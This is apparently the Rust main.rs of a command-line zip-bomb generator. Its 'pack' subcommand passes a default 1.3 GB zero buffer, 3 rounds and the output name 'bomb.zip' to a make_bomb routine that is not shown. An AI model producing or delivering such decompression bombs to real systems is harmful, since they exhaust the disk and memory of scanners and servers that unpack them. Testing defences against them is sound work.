#[macro_use]
extern crate clap;
use clap::App;

mod utils;

fn main() -> std::io::Result<()> {
    let yaml_file = load_yaml!("../cli.yml");
    let app = App::from_yaml(yaml_file);
    let subcommand_match = app.get_matches();

    match subcommand_match.subcommand() {
        ("pack", Some(publish_command)) => {
            let size = publish_command.value_of("size").unwrap_or("1300000000");
            let rounds = publish_command.value_of("rounds").unwrap_or("3");
            let output_file_name = publish_command.value_of("filename").unwrap_or("bomb.zip");
            
            let size_to_int = size.parse().unwrap();
            let rounds_to_int = rounds.parse().unwrap();
            let make_dir_path = utils::create_cwd_path("tmp_zip_bomb");
            
            utils::make_bomb(
                &make_dir_path,
                output_file_name,
                rounds_to_int,
                vec![0; size_to_int]
            )?;
        },

        ("", None) => {
            println!("
            \rNot subcommand for start
            
            \r{}
            
            \rFor more information try --help
            ", subcommand_match.usage())
        },
        
        _ => unreachable!()
    }

    Ok(())
}
